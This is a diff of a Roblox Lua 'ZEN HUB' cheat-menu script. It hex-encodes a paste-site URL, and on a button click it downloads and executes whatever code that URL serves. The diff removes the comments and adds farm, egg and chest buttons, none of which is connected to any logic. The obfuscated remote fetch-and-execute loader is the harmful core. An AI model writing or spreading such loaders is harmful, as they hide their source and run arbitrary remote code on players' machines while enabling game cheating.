@@ -1,19 +1,16 @@
--- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Create Loading Screen
 local loadingFrame = Instance.new("Frame")
-loadingFrame.Size = UDim2.new(1, 0, 1, 0)  -- Full screen
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
 loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 loadingFrame.BackgroundTransparency = 0.5
-loadingFrame.Visible = false  -- Hidden initially
+loadingFrame.Visible = false
 loadingFrame.Parent = screenGui
 
--- Create Loading Text
 local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(0, 300, 0, 50)  -- Size of the text
-loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)  -- Centered
+loadingText.Size = UDim2.new(0, 300, 0, 50)
+loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)
 loadingText.Text = "ZEN HUB\nLoading..."
 loadingText.TextSize = 30
 loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -21,7 +18,6 @@ loadingText.BackgroundTransparency = 1
 loadingText.Font = Enum.Font.GothamBold
 loadingText.Parent = loadingFrame
 
--- Create Button
 local button = Instance.new("TextButton")
 button.Size = UDim2.new(0, 200, 0, 50)
 button.Position = UDim2.new(0.5, -100, 0.5, -100)
@@ -31,25 +27,138 @@ button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.Font = Enum.Font.GothamBold
 button.Parent = screenGui
 
--- Function to convert hex to string
 local function hex_to_str(hex)
     return hex:gsub('..', function(cc)
         return string.char(tonumber(cc, 16))
     end)
 end
 
--- URL encoded in hex
 local encoded = "687474703a2f2f7670617374652e6e65742f424f733267"
 local url = hex_to_str(encoded)
 
--- When button is clicked, show loading and run script
 button.MouseButton1Click:Connect(function()
-    loadingFrame.Visible = true  -- Show loading screen
-
-    -- Run the script after a small delay (simulating loading)
-    wait(2)  -- Adjust this delay to match your loading time if needed
-    loadstring(game:HttpGet(url))()  -- Execute the script from the URL
-    
-    -- Hide loading screen once the script has loaded
+    loadingFrame.Visible = true
+    wait(2)
+    loadstring(game:HttpGet(url))()
     loadingFrame.Visible = false
+
+    -- Create Sections after script is loaded
+    local sectionsFrame = Instance.new("Frame")
+    sectionsFrame.Size = UDim2.new(0, 400, 0, 400)
+    sectionsFrame.Position = UDim2.new(0.5, -200, 0.5, -200)
+    sectionsFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    sectionsFrame.Parent = screenGui
+
+    -- Farm Section
+    local farmSection = Instance.new("Frame")
+    farmSection.Size = UDim2.new(1, 0, 0.3, 0)
+    farmSection.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    farmSection.Parent = sectionsFrame
+
+    local farmLabel = Instance.new("TextLabel")
+    farmLabel.Size = UDim2.new(1, 0, 0.1, 0)
+    farmLabel.Text = "Farm Section"
+    farmLabel.TextSize = 20
+    farmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    farmLabel.BackgroundTransparency = 1
+    farmLabel.Parent = farmSection
+
+    local autoBubbleButton = Instance.new("TextButton")
+    autoBubbleButton.Size = UDim2.new(0, 150, 0, 30)
+    autoBubbleButton.Position = UDim2.new(0.5, -75, 0.3, 0)
+    autoBubbleButton.Text = "Auto Bubble"
+    autoBubbleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    autoBubbleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    autoBubbleButton.Font = Enum.Font.GothamBold
+    autoBubbleButton.Parent = farmSection
+
+    local autoSellButton = Instance.new("TextButton")
+    autoSellButton.Size = UDim2.new(0, 150, 0, 30)
+    autoSellButton.Position = UDim2.new(0.5, -75, 0.5, 0)
+    autoSellButton.Text = "Auto Sell"
+    autoSellButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    autoSellButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    autoSellButton.Font = Enum.Font.GothamBold
+    autoSellButton.Parent = farmSection
+
+    local autoPickupButton = Instance.new("TextButton")
+    autoPickupButton.Size = UDim2.new(0, 150, 0, 30)
+    autoPickupButton.Position = UDim2.new(0.5, -75, 0.7, 0)
+    autoPickupButton.Text = "Auto Pickup"
+    autoPickupButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    autoPickupButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    autoPickupButton.Font = Enum.Font.GothamBold
+    autoPickupButton.Parent = farmSection
+
+    -- Eggs Section
+    local eggsSection = Instance.new("Frame")
+    eggsSection.Size = UDim2.new(1, 0, 0.3, 0)
+    eggsSection.Position = UDim2.new(0, 0, 0.3, 0)
+    eggsSection.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    eggsSection.Parent = sectionsFrame
+
+    local eggsLabel = Instance.new("TextLabel")
+    eggsLabel.Size = UDim2.new(1, 0, 0.1, 0)
+    eggsLabel.Text = "Eggs Section"
+    eggsLabel.TextSize = 20
+    eggsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    eggsLabel.BackgroundTransparency = 1
+    eggsLabel.Parent = eggsSection
+
+    local eggNameTextBox = Instance.new("TextBox")
+    eggNameTextBox.Size = UDim2.new(0, 150, 0, 30)
+    eggNameTextBox.Position = UDim2.new(0.5, -75, 0.3, 0)
+    eggNameTextBox.PlaceholderText = "Enter Egg Name"
+    eggNameTextBox.Parent = eggsSection
+
+    local autoEggsButton = Instance.new("TextButton")
+    autoEggsButton.Size = UDim2.new(0, 150, 0, 30)
+    autoEggsButton.Position = UDim2.new(0.5, -75, 0.5, 0)
+    autoEggsButton.Text = "Auto Eggs"
+    autoEggsButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    autoEggsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    autoEggsButton.Font = Enum.Font.GothamBold
+    autoEggsButton.Parent = eggsSection
+
+    local autoRiftButton = Instance.new("TextButton")
+    autoRiftButton.Size = UDim2.new(0, 150, 0, 30)
+    autoRiftButton.Position = UDim2.new(0.5, -75, 0.7, 0)
+    autoRiftButton.Text = "Auto Rift"
+    autoRiftButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    autoRiftButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    autoRiftButton.Font = Enum.Font.GothamBold
+    autoRiftButton.Parent = eggsSection
+
+    -- Chests Section
+    local chestsSection = Instance.new("Frame")
+    chestsSection.Size = UDim2.new(1, 0, 0.3, 0)
+    chestsSection.Position = UDim2.new(0, 0, 0.6, 0)
+    chestsSection.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    chestsSection.Parent = sectionsFrame
+
+    local chestsLabel = Instance.new("TextLabel")
+    chestsLabel.Size = UDim2.new(1, 0, 0.1, 0)
+    chestsLabel.Text = "Chests Section"
+    chestsLabel.TextSize = 20
+    chestsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    chestsLabel.BackgroundTransparency = 1
+    chestsLabel.Parent = chestsSection
+
+    local royalChestButton = Instance.new("TextButton")
+    royalChestButton.Size = UDim2.new(0, 150, 0, 30)
+    royalChestButton.Position = UDim2.new(0.5, -75, 0.3, 0)
+    royalChestButton.Text = "Royal Chest"
+    royalChestButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    royalChestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    royalChestButton.Font = Enum.Font.GothamBold
+    royalChestButton.Parent = chestsSection
+
+    local goldChestButton = Instance.new("TextButton")
+    goldChestButton.Size = UDim2.new(0, 150, 0, 30)
+    goldChestButton.Position = UDim2.new(0.5, -75, 0.7, 0)
+    goldChestButton.Text = "Gold Chest"
+    goldChestButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    goldChestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    goldChestButton.Font = Enum.Font.GothamBold
+    goldChestButton.Parent = chestsSection
 end)
